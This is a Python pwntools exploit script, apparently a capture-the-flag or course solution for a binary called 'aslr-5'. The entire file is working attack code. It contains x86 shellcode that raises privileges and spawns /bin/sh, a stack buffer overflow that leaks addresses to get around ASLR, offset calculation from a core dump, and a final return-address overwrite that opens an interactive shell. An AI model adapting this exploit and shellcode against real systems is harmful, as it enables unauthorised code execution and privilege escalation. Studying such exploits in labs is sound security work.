from pwn import *

SHELLCODE ='\xb8\xca\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x80\x89\xc3\x89\xc1\xb8\xcc\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x801\xc0Phn/shh//bi\x89\xe31\xc91\xd2\xb8\x1b\x11\x11\x11\xc1\xe0\x1c\xc1\xe8\x1c\xcd\x80'

# Shorter shellcode, stuff gets overwritten.  Only have 44 bytes to play with.
# That is only for the first write.  The second which is the actual attack we can
# actually just use the long shellcode.
SHELLCODE2 = '\x90\x90\x90\x90\xb8\xca\x00\x00\x00\xcd\x80\x89\xc3\x89\xc1\xb8\xcc\x00\x00\x00\xcd\x801\xc9\x89\xcaQhn/shh//bi\x89\xe3j\x0bX\xcd\x80'

ARG1 = ''
ENV = {}
OFFSET = 0x00

# Get function addresses
check_function_addr = ELF('./aslr-5').symbols['check_function']
input_func_addr = ELF('./aslr-5').symbols['input_func']

# ENV = {'SHELLCODE': SHELLCODE}
# ARG1 = SHELLCODE

# Start probe process
p = process(["aslr-5", ARG1], env=ENV)

# Revieve some data to start
data = p.recvuntil("name: \n")

# Send an input to leak data and then crash
# [SHELLCODE + a up to 0x88 bytes][garbage ebp][ra1(check_function)][ra2(crash)]
p.sendline(SHELLCODE2 + ('a' * (0x88-len(SHELLCODE2))) + 'aaaa' + p32(check_function_addr) + 'cccc')

# Recieve the stuff that got leaked by check function
data = p.recvuntil("some?:")
data = p.recv()
#print(data)

# Parse out the leaked data
add_array = data.split(' ')
add_array = [int(a, 16) for a in add_array if len(a) > 0 and (not 'nil' in a)]

# Find buffer address from core
p.wait()
c = Core("./core")
buffer_addr = c.stack.find(SHELLCODE2)

# Find offset between leaked addresses and the buffer
# Indicies 8 and 10 offer consistent offsets, so only they can be trusted
offset = [addr - buffer_addr for addr in add_array]


##########################################
# Start the process to be attacked
p = process(["aslr-5", ARG1], env=ENV)

# Recieve until ready for input
data = p.recvuntil("name: \n")

# Send input that will leak data and then let us do more input
# [0x88 bytes][garbage ebp][ra1(check_function)][ra2(input_func)]
p.sendline(SHELLCODE2 + ('b' * (0x88-len(SHELLCODE2))) + 'aaaa' + p32(check_function_addr) + p32(input_func_addr))

# Recieve leaked data
data = p.recvuntil("some?:")
data = p.recv()

# Parse leaked data
add_array = data.split(' ')
add_array[15] = add_array[15][:-2]
add_array = add_array[0:16]
add_array = [int(a, 16) for a in add_array if len(a) > 0 and (not 'nil' in a)]

# Use old offset to calculate buffer address and attack
buffer_addr = add_array[10] - offset[10]

# The old buffer address is 8 bytes below where our current buffers address is
# This is because we've been through the leave/start funciton twice now
# Each time through makes esp and ebp 4 bytes up the stack more
buffer_addr = buffer_addr + 8

# Now buffer addr holds where our current buffer is so we can attack like we always do
# [SHELLCODE + a's to 88 bytes][garbage ebp][buffer address]
p.sendline(SHELLCODE2 + ('a' * (0x88-len(SHELLCODE2))) + 'aaaa' + p32(buffer_addr))
p.interactive()
